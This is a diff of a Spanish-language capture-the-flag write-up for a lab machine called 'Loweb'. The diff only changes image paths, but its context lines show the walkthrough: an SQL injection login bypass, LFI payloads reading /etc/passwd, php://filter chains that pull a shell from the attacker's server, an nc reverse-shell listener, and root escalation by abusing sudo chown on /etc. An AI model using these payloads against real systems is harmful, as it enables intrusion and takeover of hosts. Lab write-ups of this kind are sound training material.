@@ -894,7 +894,7 @@ gobuster dir -u http://192.168.11.13/ -w /usr/share/wordlists/dirbuster/director
 /server-status        (Status: 403) [Size: 278]
 ```
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image.png)
+![image.png](./Images/image.png)
 
 ### Rutas encontradas en raíz:
 
@@ -903,7 +903,7 @@ gobuster dir -u http://192.168.11.13/ -w /usr/share/wordlists/dirbuster/director
 - `/server-status` → Acceso prohibido (403)
 - Archivos `.php`, `.html` → retornan 403 → puede indicar protección superficial o configuración restrictiva
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%201.png)
+![image.png](./Images/image%201.png)
 
 ### 📂 Enumeración dentro de `/library/`
 
@@ -932,7 +932,7 @@ gobuster dir -u http://192.168.11.13/library/ -w /usr/share/wordlists/dirbuster/
 - `/library/login/` → Punto de autenticación
 - `/library/admin/` → Zona posiblemente restringida
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%202.png)
+![image.png](./Images/image%202.png)
 
 # 🔓 GANANDO ACCESO
 
@@ -1011,9 +1011,9 @@ SELECT * FROM users WHERE ('true') AND ('true')
 
 🔓 Lo que provoca que la condición **siempre sea verdadera** y te dé acceso, **sin conocer un usuario válido ni una contraseña real**.
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%203.png)
+![image.png](./Images/image%203.png)
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%204.png)
+![image.png](./Images/image%204.png)
 
 ## LFI (Local File Inclusion)
 
@@ -1026,11 +1026,11 @@ Se navega por la web y se hace Hovering en diferentes “botones” u opciones q
     ```
     
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%205.png)
+![image.png](./Images/image%205.png)
 
 Esto indica que `index.php` **incluye archivos PHP dinámicamente** basándose en el parámetro `lang`.
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%206.png)
+![image.png](./Images/image%206.png)
 
 ### 📌 ¿Por qué esto es una posible vulnerabilidad?
 
@@ -1071,9 +1071,9 @@ index.php?lang=../../../../../../etc/passwd
 
 ## CAIDO
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%207.png)
+![image.png](./Images/image%207.png)
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%208.png)
+![image.png](./Images/image%208.png)
 
 ### 🎯 **Vulnerabilidad confirmada**:
 
@@ -1107,7 +1107,7 @@ GET /library/admin/index.php?lang=php://filter/convert.base64-encode/resource=in
 
 ### **➡️ Técnica: LFI + PHP Wrapper (php://filter) para File Disclosure**
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%209.png)
+![image.png](./Images/image%209.png)
 
 - **LFI (Local File Inclusion)**: El parámetro vulnerable permite incluir archivos locales arbitrarios.
 - **Wrapper `php://filter`**: Se usa para evadir ejecución y obtener el contenido del archivo en crudo, codificado en base64.
@@ -1135,7 +1135,7 @@ No hay validación ni sanitización de entrada. Esto permite:
 - En este caso, el filtro `convert.base64-encode` codifica el contenido del archivo a base64.
 - El archivo incluido (`index.php`, `script.php`, etc.) **no se ejecuta**, sino que su contenido se muestra codificado.
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2010.png)
+![image.png](./Images/image%2010.png)
 
 ## **Wrapper con php_filter_chain_generator**
 
@@ -1173,7 +1173,7 @@ Esto servirá el archivo Zayrus_shell en `http://IP_LOCAL/Zayrus_shell`
 nc -nlvp 443
 ```
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2011.png)
+![image.png](./Images/image%2011.png)
 
 ### 🧪 4. Generar wrapper con `php_filter_chain_generator`
 
@@ -1189,9 +1189,9 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode
 
 📌 **Importante:** si el wrapper es largo generará error 
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2012.png)
+![image.png](./Images/image%2012.png)
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2013.png)
+![image.png](./Images/image%2013.png)
 
 # 🔓 INTRUSIÓN - ESCALANDO PRIVILEGIOS
 
@@ -1205,7 +1205,7 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode
 uname -a
 ```
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2014.png)
+![image.png](./Images/image%2014.png)
 
 ### 👤 Información de usuarios
 
@@ -1213,7 +1213,7 @@ uname -a
 cat /etc/passwd
 ```
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2015.png)
+![image.png](./Images/image%2015.png)
 
 ### 🔐 Revisar si puedes usar sudo
 
@@ -1221,7 +1221,7 @@ cat /etc/passwd
 sudo -l
 ```
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2016.png)
+![image.png](./Images/image%2016.png)
 
 ### 🔍 Buscar credenciales en archivos
 
@@ -1231,7 +1231,7 @@ grep -Ri 'password' / 2>/dev/null
 
 Es una búsqueda **recursiva e insensible a mayúsculas** de la palabra **"password"** en **todos los archivos del sistema (`/`).**
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2017.png)
+![image.png](./Images/image%2017.png)
 
 ### 🔍 Desglose parte por parte:
 
@@ -1256,7 +1256,7 @@ Contraseña: contraseñaconÑjeje
 
 ### 📜 1**. Ver privilegios con `sudo -l`**
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2018.png)
+![image.png](./Images/image%2018.png)
 
 🔓 Esto significa: **el usuario `r3dh4ck` puede ejecutar el comando `chown` como root sin contraseña**.
 
@@ -1267,7 +1267,7 @@ sudo /usr/bin/chown r3dh4ck:r3dh4ck /etc
 
 ```
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2019.png)
+![image.png](./Images/image%2019.png)
 
 ### 📘 ¿Qué hace esto?
 
@@ -1296,7 +1296,7 @@ root2:"hash_openssl":0:0:root:/root:/bin/bash
 
 Acceso como **root completo**.
 
-![image.png](Loweb%20by%20Skvll%20Zayru5%201e4cb9b1e60b805cb36fd80bc2430599/image%2020.png)
+![image.png](./Images/image%2020.png)
 
 # 📌 **Nota extra: otras rutas de explotación posibles** 📌
 
